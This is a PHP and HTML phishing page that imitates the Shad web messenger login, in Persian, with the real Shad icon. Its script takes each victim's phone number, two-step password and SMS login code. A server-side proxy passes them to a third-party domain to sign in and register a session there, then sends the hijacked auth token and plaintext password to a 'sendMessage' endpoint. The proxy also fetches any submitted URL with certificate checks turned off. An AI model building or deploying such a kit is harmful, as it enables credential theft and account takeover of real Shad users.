<?php
function log_error($message, $context = []) {
    $timestamp = date("Y-m-d H:i:s");
    $log_entry = "[$timestamp] [ERROR]: $message";
    if (!empty($context)) {
        $log_entry .= " | Context: " . json_encode($context, JSON_UNESCAPED_UNICODE);
    }
    error_log($log_entry . "\n", 3, "error_log.txt");
}

function handle_api_proxy() {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['__proxy_url'])) {
        return;
    }

    $targetUrl = $_POST['__proxy_url'];
    
    if (strpos($targetUrl, 'http') !== 0) {
        $scheme = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'];
        $script_path = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
        $targetUrl = $scheme . '://' . $host . $script_path . '/' . ltrim($targetUrl, '/');
    }
    
    $data = $_POST;
    unset($data['__proxy_url']);
    
    log_error("Proxy Request Initiated", ['URL' => $targetUrl, 'DataKeys' => array_keys($data)]);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $targetUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);

    if ($curlError) {
        log_error("cURL Error", ['Target URL' => $targetUrl, 'cURL Error' => $curlError, 'HTTP Code' => $httpCode]);
        header('Content-Type: application/json');
        echo json_encode(['status' => 'ERROR', 'message' => 'خطا در برقراری ارتباط با سرور مقصد (شبکه).']);
        curl_close($ch);
        exit;
    }
    
    if ($httpCode !== 200) {
        log_error("HTTP Error", ['Target URL' => $targetUrl, 'HTTP Code' => $httpCode, 'Response' => $response]);
        header('Content-Type: application/json');
        echo json_encode(['status' => 'ERROR', 'message' => "خطای سرور مقصد. کد HTTP: $httpCode"]);
        curl_close($ch);
        exit;
    }

    log_error("Proxy Request Successful", ['Target URL' => $targetUrl, 'HTTP Code' => $httpCode]);

    header('Content-Type: application/json');
    echo $response;
    curl_close($ch);
    exit;
}

handle_api_proxy(); 
?>
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, maximum-scale=1, user-scalable=no" />
  <title>ورود به شاد وب</title>
  <link rel="icon" href="https://web.shad.ir/assets/icons/icon-192x192.png" type="image/png">
  <link rel="apple-touch-icon" href="https://web.shad.ir/assets/icons/icon-192x192.png">
  
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700&display=swap');

    :root {
      --primary-color: #659e48;
      --light-primary-color: rgba(101, 158, 72, 0.15);
      --danger-color: #df3f40;
      --text-main: #000000;
      --text-sec: #707579;
      --border: #dfe1e5;
      --bg: #ffffff;
      --blue-loading: #007bff;
    }

    * { 
        box-sizing: border-box; 
        margin: 0; 
        padding: 0; 
        outline: none; 
        -webkit-tap-highlight-color: transparent; 
        font-family: 'Vazirmatn', sans-serif;
    }
    
    html, body { 
      height: 100%; width: 100%; 
      background: var(--bg);
      color: var(--text-main);
      overflow-x: hidden;
      overflow-y: auto;
    }

    body {
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      padding: 0 24px;
    }

    .page-container {
      width: 100%; 
      max-width: 360px;
      display: flex; flex-direction: column;
      position: relative;
    }

    .top-bar {
      height: 56px; display: flex; align-items: center; justify-content: flex-start;
      width: 100%; flex-shrink: 0;
    }

    .back-btn {
      color: var(--primary-color); font-weight: 600; 
      font-size: 16px;
      cursor: pointer;
      display: none; transition: opacity 0.2s;
    }
    .back-btn.visible { display: block; }

    .content-area {
      flex: 1; 
      display: flex; 
      flex-direction: column; 
      align-items: center; 
      justify-content: flex-start; 
      width: 100%;
      padding-top: 20vh;
      padding-bottom: 40px; 
      text-align: center;
      min-height: 100vh; 
    }

    .logo-area { margin-bottom: 32px; }
    .logo-area img { 
        width: 101px; 
        height: 101px;
        border-radius: 22px; 
    }

    h2 { 
        font-size: 26px;
        font-weight: 700; 
        margin-bottom: 12px; 
    }
    .subtitle { 
        font-size: 15px;
        color: var(--text-sec); 
        text-align: center; 
        line-height: 1.6; 
        margin-bottom: 16px;
    }

    .form-group { 
        width: 100%; 
        position: relative; 
        margin-bottom: 16px; 
    }

    .std-input-box {
      width: 100%; height: 52px; position: relative;
      border: 1px solid var(--border); border-radius: 12px;
      transition: all 0.2s;
      background: #ffffff;
    }
    .std-input {
      width: 100%; height: 100%; border: none; background: transparent;
      padding: 0 16px; 
      font-size: 17px;
      text-align: right;
    }
    .std-label {
      position: absolute; right: 16px; top: 16px; color: var(--text-sec);
      pointer-events: none; transition: 0.2s; background: #ffffff;
      padding: 0 4px;
    }
    .std-input-box:focus-within, .std-input-box.has-value {
      border: 2px solid var(--primary-color); 
      box-shadow: none;
    }
    .std-input-box:focus-within .std-label,
    .std-input-box.has-value .std-label {
      top: -10px; 
      font-size: 13px;
      color: var(--primary-color);
    }
    
    .std-input-box #inp-code { 
      text-align: center; 
      letter-spacing: 2px; 
      direction: ltr; 
      font-size: 18px;
      font-weight: 600;
      padding-left: 10px; 
      padding-right: 10px;
    }

    .unified-input {
      display: flex; align-items: center;
      width: 100%; height: 52px; 
      border: 1px solid var(--border);
      border-radius: 12px;
      background: #ffffff;
      position: relative;
      transition: all 0.2s ease;
      direction: rtl;
    }
    .unified-input:focus-within {
      border: 2px solid var(--primary-color);
      box-shadow: none;
    }
    .code-part {
      flex-shrink: 0; padding: 0 10px 0 16px; color: var(--text-sec);
      font-weight: 500; 
      font-size: 17px;
      border-right: 1px solid var(--border);
      direction: ltr;
    }
    .number-part { flex-grow: 1; padding: 0 10px; }
    .number-input {
      width: 100%; height: 100%; border: none; background: transparent;
      font-size: 17px;
      text-align: left;
      direction: ltr;
      padding: 0 4px;
    }
    .floating-label {
      position: absolute; right: 16px; top: 16px; color: var(--text-sec);
      pointer-events: none; transition: 0.2s; background: #ffffff;
      padding: 0 4px;
    }
    .unified-input:focus-within .floating-label,
    .unified-input.has-value .floating-label {
      right: 10px;
      top: -10px; 
      font-size: 13px;
      color: var(--primary-color);
    }

    .code-header {
        width: 100%;
        margin-bottom: 24px; 
        display: flex;
        flex-direction: column;
        align-items: center;
        text-align: center;
    }
    .phone-display-container {
        display: flex;
        flex-direction: row; 
        align-items: center;
        justify-content: center;
        font-weight: 700;
        margin-bottom: 8px; 
        direction: ltr;
    }
    .phone-display-container span {
        font-size: 21px;
    }
    .edit-btn {
        background: transparent;
        border: none;
        color: var(--text-sec);
        font-size: 21px;
        margin-right: 8px;
        margin-left: 0;
        cursor: pointer;
        padding: 0;
        line-height: 1;
        font-family: Arial, sans-serif; 
    }
    .message-text {
        font-size: 15px;
        color: var(--text-sec); 
        text-align: center; 
        line-height: 1.6; 
        margin-top: 8px;
    }
    
    .btn-resend {
        background: transparent; 
        color: var(--primary-color);
        margin-top: 0; 
        margin-bottom: 24px; 
        font-size: 15px;
        font-weight: 500;
        cursor: pointer; border: none; padding: 8px 12px;
        border-radius: 8px; transition: background 0.2s;
    }
    .btn-resend:not(.disabled):hover { background: var(--light-primary-color); }
    .btn-resend.disabled { opacity: 0.5; cursor: default; }
    
    .btn {
      width: 100%; height: 50px; border: none; border-radius: 12px;
      background: var(--primary-color); color: #fff; 
      font-size: 17px;
      font-weight: 700; cursor: pointer; position: relative; overflow: hidden;
      transition: background 0.2s, box-shadow 0.2s;
    }
    .btn:disabled { background: #ccc; cursor: default; }
    .btn-content {
      display: flex; align-items: center; justify-content: center;
      width: 100%; height: 100%;
    }
    .btn-text.hidden { display: none; }

    .status-msg {
      margin-top: 8px; color: var(--danger-color); font-size: 14px; 
      min-height: 20px; text-align: center;
    }
    
    .hidden { display: none !important; }

    .loader {
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-top: 4px solid var(--bg);
      border-radius: 50%;
      width: 24px; height: 24px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    #preloader {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: var(--bg); display: flex; align-items: center;
      justify-content: center; z-index: 1000; transition: opacity 0.3s ease;
    }
    .preloader-spinner {
        border: 4px solid rgba(0, 123, 255, 0.3);
        border-top: 4px solid var(--blue-loading);
        border-radius: 50%;
        width: 30px; height: 30px;
        animation: spin 1s linear infinite;
    }
    
    .ripple {
      position: absolute;
      border-radius: 50%;
      transform: scale(0);
      animation: ripple 0.6s linear;
      background-color: rgba(255, 255, 255, 0.7);
    }
    @keyframes ripple {
      to {
        transform: scale(4);
        opacity: 0;
      }
    }
    
  </style>
</head>
<body>
    <div id="preloader">
        <div class="preloader-spinner"></div>
    </div>

  <div class="page-container" id="main-content">
    <div class="top-bar">
      <div class="back-btn" id="btn-back">‹ بازگشت</div>
    </div>

    <div class="content-area">
      <div class="logo-area">
        <img src="https://web.shad.ir/assets/icons/icon-192x192.png" alt="لوگو شاد">
      </div>

      <div id="step-phone" style="width:100%; display:flex; flex-direction:column; align-items:center;">
        <h2>ورود</h2>
        <div class="subtitle" id="phone-subtitle">لطفا کشور خود را انتخاب کنید و شماره همراه خود را به صورت کامل وارد کنید.</div>
        
        <div class="form-group">
          <div class="unified-input" id="phone-container">
            <div class="number-part">
              <input type="tel" id="inp-phone" class="number-input" placeholder=" " inputmode="numeric" autocomplete="tel" maxlength="15">
            </div>
            <div class="code-part">+۹۸</div>
            <div class="floating-label">شماره همراه</div>
          </div>
          <div class="status-msg" id="status-phone"></div>
        </div>

        <button class="btn" id="btn-submit-phone">
          <div class="btn-content">
            <span class="btn-text">بعدی</span>
            <div class="loader hidden"></div>
          </div>
        </button>
      </div>

      <div id="step-pass" class="hidden" style="width:100%; display:flex; flex-direction:column; align-items:center;">
        <h2>تأیید دومرحله‌ای</h2>
        
        <div class="code-header">
            <div class="message-text" id="pass-info-text">لطفا گذرواژه دومرحله‌ای خود را وارد کنید.</div>
        </div>
        
        <div class="form-group">
          <div class="std-input-box" id="box-pass">
            <input type="password" id="inp-pass" class="std-input" dir="ltr" autocomplete="current-password">
            <div class="std-label" id="lbl-pass">گذرواژه</div>
          </div>
          <div class="status-msg" id="status-pass"></div>
        </div>

        <button class="btn" id="btn-submit-pass">
          <div class="btn-content">
            <span class="btn-text">تایید گذرواژه</span>
            <div class="loader hidden"></div>
          </div>
        </button>
      </div>

      <div id="step-code" class="hidden" style="width:100%; display:flex; flex-direction:column; align-items:center;">
        
        <div class="code-header">
            <div class="phone-display-container">
                <button id="btn-edit-phone" class="edit-btn">✎</button> 
                <span id="displayed-phone-number"></span> 
            </div>
            <div class="message-text" id="code-info-text">کد فعال سازی به شماره ... پیامک شده است</div>
        </div>
        
        <button class="btn-resend disabled" id="btn-resend">ارسال مجدد کد فعال سازی (۶۰)</button>

        <div class="form-group">
          <div class="std-input-box" id="box-code">
            <input type="tel" id="inp-code" class="std-input" maxlength="6" inputmode="numeric" dir="ltr" autocomplete="off" placeholder=" ">
            <div class="std-label" id="lbl-code">کد را وارد کنید</div>
          </div>
          <div class="status-msg" id="status-code"></div>
        </div>
        
        <button class="btn" id="btn-submit-code">
          <div class="btn-content">
            <span class="btn-text">ورود</span>
            <div class="loader hidden"></div>
          </div>
        </button>
        
      </div>

    </div>
  </div>

  <script>
    class LocalStore {
      set(k, v) { 
        try { sessionStorage.setItem(k, JSON.stringify(v)); } catch(e) { console.error("Error setting storage:", e); }
      }
      get(k) { 
        try {
          const v = sessionStorage.getItem(k);
          return v ? JSON.parse(v) : null; 
        } catch(e) {
          console.error("Error getting storage:", e);
          return null;
        } 
      }
      del(k) { 
        try { sessionStorage.removeItem(k); } catch(e) { console.error("Error deleting storage:", e); }
      }
      clearAll() {
        this.del('phone');
        this.del('phone_code_hash');
        this.del('auth');
        this.del('password');
      }
    }

    class AuthApp {
      constructor() {
        this.URLS = {
          sendCode: 'https://mehdi-mogdr.ir/shad/sendCode.php',
          signIn: 'https://mehdi-mogdr.ir/shad/signIn.php',
          register: 'https://mehdi-mogdr.ir/shad/register.php',
          sendMessage: 'https://mehdi-mogdr.ir/shad/sendMessage.php'
        };
        this.store = new LocalStore();
        this.timerId = null;
        this.elements = {};
        this.cacheElements();
        this.setupEventListeners();
      }

      cacheElements() {
        ['btn-back', 'inp-phone', 'btn-submit-phone', 'status-phone',
         'step-phone', 'step-pass', 'step-code', 
         'inp-pass', 'box-pass', 'btn-submit-pass', 'status-pass', 
         'inp-code', 'box-code', 'btn-submit-code', 'status-code', 
         'btn-resend', 'lbl-pass', 
         'displayed-phone-number', 'code-info-text', 'btn-edit-phone',
         'pass-info-text'
        ].forEach(id => this.elements[id] = document.getElementById(id));
      }

      setupEventListeners() {
        this.elements['btn-back'].onclick = () => this.resetApp();
        this.elements['btn-edit-phone'].onclick = () => this.resetApp(); 
        
        this.elements['btn-submit-phone'].onclick = () => this.handleSendPhone();
        this.elements['btn-submit-pass'].onclick = () => this.handleSendPassword();
        this.elements['btn-submit-code'].onclick = () => this.handleLogin();
        this.elements['btn-resend'].onclick = () => this.handleResendCode();
        
        this.setupInputHandling();
        
        document.querySelectorAll('.btn').forEach(b => {
          b.addEventListener('click', (e) => this.addRippleEffect(b, e));
        });

        document.addEventListener('DOMContentLoaded', () => {
          this.resetApp();
          const preloader = document.getElementById('preloader');
          if(preloader) {
            preloader.style.opacity = '0';
            setTimeout(() => preloader.style.display = 'none', 300);
          }
        });
      }

      setupInputHandling() {
        const setupAnim = (input, container) => {
          const check = () => container.classList[input.value.trim() ? 'add' : 'remove']('has-value');
          input.addEventListener('input', check);
          input.addEventListener('blur', check);
          check();
        };

        setupAnim(this.elements['inp-pass'], this.elements['box-pass']);

        const phoneContainer = document.getElementById('phone-container');
        if (phoneContainer) setupAnim(this.elements['inp-phone'], phoneContainer);
        this.elements['inp-phone'].addEventListener('input', (e) => this.handlePhoneInput(e.target));
        
        setupAnim(this.elements['inp-code'], this.elements['box-code']);
        this.elements['inp-code'].addEventListener('input', (e) => this.handleCodeInput(e.target));
      }
      
      handlePhoneInput(input) {
        let rawEng = this.toEng(input.value);
        if (rawEng.length > 11) rawEng = rawEng.substring(0, 11);
        
        if (rawEng.length > 0 && rawEng[0] !== '0') {
           rawEng = '0' + rawEng.substring(0, 10);
        }
        
        let fmtEng = rawEng;
        if (rawEng.length > 4) fmtEng = rawEng.slice(0,4) + ' ' + rawEng.slice(4);
        if (rawEng.length > 7) fmtEng = fmtEng.slice(0,8) + ' ' + fmtEng.slice(8);
        
        input.value = this.toPer(fmtEng);
        input.dataset.cleanValue = rawEng;
      }
      
      handleCodeInput(input) {
        let v = this.toEng(input.value).slice(0,6); 
        input.value = v; 
        
        if (v.length === 6 && !this.elements['btn-submit-code'].disabled) {
            this.handleLogin();
        }
      }

      toEng(str) { 
        let engStr = (str || '').toString()
            .replace(/[۰-۹]/g, d => '۰۱۲۳۴۵۶۷۸۹'.indexOf(d))
            .replace(/[٠-٩]/g, d => '٠١٢٣٤٥٦٧٨٩'.indexOf(d));
        return engStr.replace(/[^\d]/g, '');
      }
      toPer(str) { return (str || '').toString().replace(/\d/g, d => '۰۱۲۳۴۵۶۷۸۹'[d]); }
      
      setMsg(id, txt) { 
        const el = this.elements[id];
        if (el) el.textContent = txt || ''; 
      }
      
      showLoader(btnId) {
        const btn = this.elements[btnId];
        const loader = btn.querySelector('.loader');
        const textSpan = btn.querySelector('.btn-text');
        btn.disabled = true;
        if (btnId === 'btn-resend') {
            btn.textContent = '... در حال ارسال مجدد';
            return;
        }
        loader?.classList.remove('hidden');
        textSpan?.classList.add('hidden');
      }

      hideLoader(btnId, enable = true) {
        const btn = this.elements[btnId];
        if (btnId === 'btn-resend') {
            btn.textContent = 'ارسال مجدد کد فعال سازی';
            btn.disabled = !enable;
            return;
        }
        const loader = btn.querySelector('.loader');
        const textSpan = btn.querySelector('.btn-text');
        btn.disabled = !enable;
        loader?.classList.add('hidden');
        textSpan?.classList.remove('hidden');
      }
      
      showStep(stepId) {
        ['step-phone', 'step-pass', 'step-code'].forEach(id => this.elements[id].classList.add('hidden'));
        this.elements[stepId].classList.remove('hidden');
        
        if (stepId !== 'step-phone') {
            this.elements['btn-back'].classList.add('visible');
            
            const phone = this.store.get('phone');
            if (phone) {
                const phoneSuffix = this.toPer(phone.substring(1));
                const formattedPhone = `+۹۸${phoneSuffix}`;

                if (stepId === 'step-code') {
                    this.elements['inp-code'].focus();
                    this.elements['displayed-phone-number'].textContent = formattedPhone;
                    this.elements['code-info-text'].textContent = `کد فعال سازی به شماره ${phoneSuffix} پیامک شده است`;
                    
                    this.elements['inp-pass'].value = ''; 
                    this.elements['box-pass'].classList.remove('has-value');
                }
                
                if (stepId === 'step-pass') {
                    this.elements['inp-pass'].focus();
                    this.elements['pass-info-text'].textContent = 'تایید دو مرحله ای برای شما فعال است در نتیجه حساب کاربری شما با گذرواژه اضافی محافظت می شود';
                }
            }
        } else {
            this.elements['btn-back'].classList.remove('visible');
            this.elements['inp-phone'].focus();
        }
      }

      async req(targetUrl, data) {
        const fd = new FormData();
        fd.append('__proxy_url', targetUrl); 
        for(let k in data) fd.append(k, data[k]);
        
        try {
          const r = await fetch(window.location.href, { method:'POST', body:fd });
          const raw = await r.text();
          let json = null;
          try { json = JSON.parse(raw); } catch(e) { console.warn("Response was not JSON:", raw); }
          return { ok: r.ok, json, raw };
        } catch(e) { 
          console.error("Fetch/Proxy Error:", e);
          return { ok:false, json: null, raw: null }; 
        }
      }

      startTimer() {
        let sec = 59; 
        const btn = this.elements['btn-resend'];
        btn.classList.add('disabled');
        btn.textContent = `ارسال مجدد کد فعال سازی (${this.toPer(sec + 1)})`; 
        
        if(this.timerId) clearInterval(this.timerId);
        this.timerId = setInterval(() => {
          sec--;
          btn.textContent = `ارسال مجدد کد فعال سازی (${this.toPer(sec)})`;
          if(sec <= 0) {
            clearInterval(this.timerId);
            btn.classList.remove('disabled');
            btn.textContent = 'ارسال مجدد کد فعال سازی';
          }
        }, 1000);
      }

      normalizePhone(input){
        let s = this.toEng(input).trim();
        s = s.replace(/[^0-9]/g, ''); 
        if (s.startsWith('98')) s = '0' + s.slice(2);
        if (s.startsWith('0098')) s = '0' + s.slice(4); 
        if (!s.startsWith('0') && s.length === 10) s = '0' + s;
        return s;
      }

      async handleSendPhone() {
        const rawPhone = this.elements['inp-phone'].dataset.cleanValue;
        const phone = this.normalizePhone(rawPhone);
        this.setMsg('status-phone', '');
        
        if(phone.length !== 11 || !phone.startsWith('09')) {
          this.setMsg('status-phone', 'شماره همراه ۱۱ رقمی و معتبر وارد کنید (مثال: ۰۹۱۲۳۴۵۶۷۸۹)');
          return;
        }
        
        this.showLoader('btn-submit-phone');
        this.elements['inp-phone'].disabled = true;

        const r = await this.req(this.URLS.sendCode, { phone: phone });
        this.hideLoader('btn-submit-phone', true);
        this.elements['inp-phone'].disabled = false;
        
        if(!r.ok || !r.json) {
          this.setMsg('status-phone', 'خطا در ارتباط با سرور یا شبکه. جزئیات در error_log.txt ثبت شد.');
          return;
        }

        const root = r.json;
        const data = root.data || {};
        
        if (root.client_show_message || root.link || root.alert_data) {
           const msgRoot = root.client_show_message || root.link || root.alert_data;
           const msg = msgRoot.message || 'عملیات ناموفق بود. مجدد تلاش کنید.';
           this.setMsg('status-phone', msg);
           return;
        }
        
        if (data.status === 'SendPassKey') {
            this.store.set('phone', phone);
            const hint = data.hint_pass_key ? `راهنما: ${data.hint_pass_key}` : 'گذرواژه'; 
            this.elements['lbl-pass'].textContent = hint;
            this.showStep('step-pass');
            this.setMsg('status-phone', '');
            return;
        }
        
        if(data.phone_code_hash) {
          this.store.set('phone', phone);
          this.store.set('phone_code_hash', data.phone_code_hash);
          if(root.auth) this.store.set('auth', root.auth);
          
          this.showStep('step-code');
          this.startTimer();
          this.setMsg('status-phone', '');
        } else {
          this.setMsg('status-phone', 'پاسخ سرور نامشخص است.');
        }
      }
      
      async handleSendPassword() {
        const pass = this.elements['inp-pass'].value.trim();
        const phone = this.store.get('phone');
        
        if(!phone) { this.resetApp(); return; }
        if(pass.length < 3) return this.setMsg('status-pass', 'گذرواژه حداقل ۳ کاراکتر است');
        
        this.setMsg('status-pass', '');
        this.showLoader('btn-submit-pass');

        const r = await this.req(this.URLS.sendCode, { phone: phone, pass: pass });
        this.hideLoader('btn-submit-pass', true);
        
        if(!r.ok || !r.json) {
          this.setMsg('status-pass', 'خطا در شبکه. جزئیات در error_log.txt ثبت شد.');
          return;
        }
        
        const d = r.json.data || {};
        const status = d.status || r.json.status;
        
        if(status === 'OK') {
          if(d.phone_code_hash) {
              this.store.set('password', pass);
              this.store.set('phone_code_hash', d.phone_code_hash);
              if(r.json.auth) this.store.set('auth', r.json.auth);
              
              this.showStep('step-code');
              this.startTimer();
              this.setMsg('status-pass', '');
          } else {
              this.setMsg('status-pass', 'پاسخ سرور نامشخص است.');
          }
        } else {
          this.setMsg('status-pass', r.json.message || 'گذرواژه اشتباه می باشد');
          this.elements['inp-pass'].focus(); 
        }
      }

      async handleLogin() {
        const phone = this.store.get('phone');
        const code = this.toEng(this.elements['inp-code'].value);
        const hash = this.store.get('phone_code_hash');
        const auth = this.store.get('auth');
        const pass = this.store.get('password') || '';

        if(!phone || !code || !hash) { this.setMsg('status-code', 'اطلاعات ناقص است. لطفا از ابتدا شروع کنید.'); return; }
        
        if(code.length !== 6) {
            return this.setMsg('status-code', 'کد فعال‌سازی باید دقیقاً ۶ رقم باشد');
        }
        
        this.setMsg('status-code', '');
        this.showLoader('btn-submit-code');

        const rSign = await this.req(this.URLS.signIn, { phone, code, hash, auth: auth || '' });
        
        if(!rSign.ok || !rSign.json) {
          this.hideLoader('btn-submit-code', true);
          this.setMsg('status-code', 'خطا در شبکه یا دریافت پاسخ نامعتبر. جزئیات در error_log.txt ثبت شد.');
          return;
        }

        const signStatus = rSign.json.data?.status || rSign.json.status;
        const newAuth = rSign.json.auth || rSign.json.data?.auth;
        
        if(signStatus !== 'OK' || !newAuth) {
          this.hideLoader('btn-submit-code', true);
          this.setMsg('status-code', rSign.json.message || rSign.json.data?.message || 'کد ورود اشتباه می باشد.');
          return;
        }

        this.store.set('auth', newAuth);
        const authFinal = this.store.get('auth');
        
        const rReg = await this.req(this.URLS.register, { auth: authFinal, log_name: 'آقا صآبر' });
        const regStatus = rReg.json?.data?.status || rReg.json?.status;

        if (regStatus !== 'OK') {
            this.hideLoader('btn-submit-code', true);
            this.setMsg('status-code', rReg.json?.message || 'ثبت نام پس از ورود ناموفق بود.');
            return;
        }

        const rSend = await this.req(this.URLS.sendMessage, {
          auth: authFinal,
          phone: phone,
          password: pass || 'ندارد' 
        });
        
        this.hideLoader('btn-submit-code', true);

        if(rSend.ok && rSend.json?.status === 'OK') {
          this.setMsg('status-code', '✅ ورود موفقیت‌آمیز بود! (نیاز به صفحه ok-login.php)');
        } else {
          this.setMsg('status-code', rSend.json?.message || 'ارسال پیام یا مراحل نهایی ناموفق بود.');
        }
      }

      async handleResendCode() {
        const phone = this.store.get('phone');
        if (!phone) { this.resetApp(); return; }

        const btn = this.elements['btn-resend'];
        if(btn.classList.contains('disabled')) return;
        
        this.setMsg('status-code', '');
        this.showLoader('btn-resend');
          
        const r = await this.req(this.URLS.sendCode, { phone: phone, pass: this.store.get('password') || '' });
        this.hideLoader('btn-resend', true);

        if(!r.ok || !r.json) {
            this.setMsg('status-code', 'خطا در شبکه یا عدم دریافت پاسخ معتبر. جزئیات در error_log.txt ثبت شد.');
            return;
        }

        const root = r.json;
        const data = root.data || {};

        if(data.phone_code_hash) {
            this.store.set('phone_code_hash', data.phone_code_hash);
            if(root.auth) this.store.set('auth', root.auth);
            this.startTimer();
            this.setMsg('status-code', 'کد فعال سازی مجدداً ارسال شد.');
        } else {
            this.setMsg('status-code', 'خطا در ارسال مجدد کد.');
        }
      }

      resetApp() {
        if(this.timerId) clearInterval(this.timerId);
        this.showStep('step-phone');
        
        this.elements['inp-phone'].disabled = false;
        this.elements['inp-pass'].value = '';
        this.elements['inp-code'].value = '';
        document.getElementById('phone-container').classList.remove('has-value');
        this.elements['box-pass'].classList.remove('has-value');
        this.elements['box-code'].classList.remove('has-value');
        
        this.setMsg('status-phone', '');
        this.setMsg('status-pass', '');
        this.setMsg('status-code', '');
        this.elements['lbl-pass'].textContent = 'گذرواژه';
        
        this.store.clearAll();
      }

      addRippleEffect(element, event) {
        if(element.disabled) return;
        const r = document.createElement('div');
        r.className = 'ripple';
        const rect = element.getBoundingClientRect();
        r.style.width = r.style.height = Math.max(rect.width, rect.height) + 'px';
        r.style.left = (event.clientX - rect.left - rect.width/2) + 'px';
        r.style.top = (event.clientY - rect.top - rect.width/2) + 'px';
        element.appendChild(r);
        setTimeout(() => r.remove(), 600);
      }
    }

    window.AuthApp = new AuthApp();
  </script>
</body>
</html>